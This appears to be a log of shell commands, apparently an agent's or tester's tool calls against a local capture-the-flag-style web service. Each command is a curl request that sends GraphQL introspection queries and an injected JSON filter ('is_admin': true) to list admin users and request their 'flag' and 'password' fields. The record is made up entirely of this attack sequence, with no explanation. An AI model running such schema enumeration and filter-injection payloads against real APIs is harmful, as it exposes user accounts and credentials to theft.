input.command:
curl -s -X POST http://localhost:46337/api/users \
  -H "Content-Type: application/json" \
  -d '{"query":"query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 100}\") { username email } }"}'

input.command:
curl -s -X POST http://localhost:46337/api/users \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name fields { name } } } }"}'

curl -s -X POST http://localhost:46337/api/users \
  -H "Content-Type: application/json" \
  -d '{"query":"query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 100}\") { username email flag password } }"}'
echo "---"
curl -s -X POST http://localhost:46337/api/users \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } types { name kind fields { name type { name } } } } }"}'

input.command:
curl -s -X POST http://localhost:46337/api/users \
  -H "Content-Type: application/json" \
  -d '{"query":"query { users(search: \"{\\\"is_admin\\\": true}\", options: \"{\\\"skip\\\": 0, \\\"limit\\\": 100}\") { username email flag } }"}'
echo "---"
curl -s -X POST http://localhost:46337/api/users \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"UserType\") { name fields { name type { name kind ofType { name } } } } }"}'
